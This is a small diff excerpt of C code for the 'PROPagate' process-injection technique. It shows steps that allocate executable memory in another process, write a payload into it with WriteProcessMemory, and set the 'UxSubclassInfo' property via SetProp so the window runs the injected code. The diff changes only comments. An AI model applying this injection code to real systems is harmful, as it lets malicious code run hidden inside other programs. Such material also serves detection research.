@@ -100,7 +100,7 @@ int main(void){
             MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
         if(pfnSubclass!=NULL){
           wprintf(L"[+] New remote subclass procedure is %p\n", pfnSubclass);
-          // 8. Write our payload to memory including pointer to old subclass header
+          // 8. Write our payload to memory
           WriteProcessMemory(hProcess, pfnSubclass, PAYLOAD, PAYLOAD_SIZE, &written);
           // 9. Set pfnSubclass to payload address, and write 
           //    back to process in new area of memory
@@ -109,7 +109,7 @@ int main(void){
           // 10. Create a named event to wait for signal on.
           hEvent=CreateEvent(NULL,FALSE,FALSE,L"propagate");
           if(hEvent!=NULL){
-            // 11. Update with SetProp
+            // 11. Update subclass procedure with SetProp
             wprintf(L"[+] Calling SetProp.\n");
             bResult=SetProp(hWnd, L"UxSubclassInfo", psh);
             if(bResult){
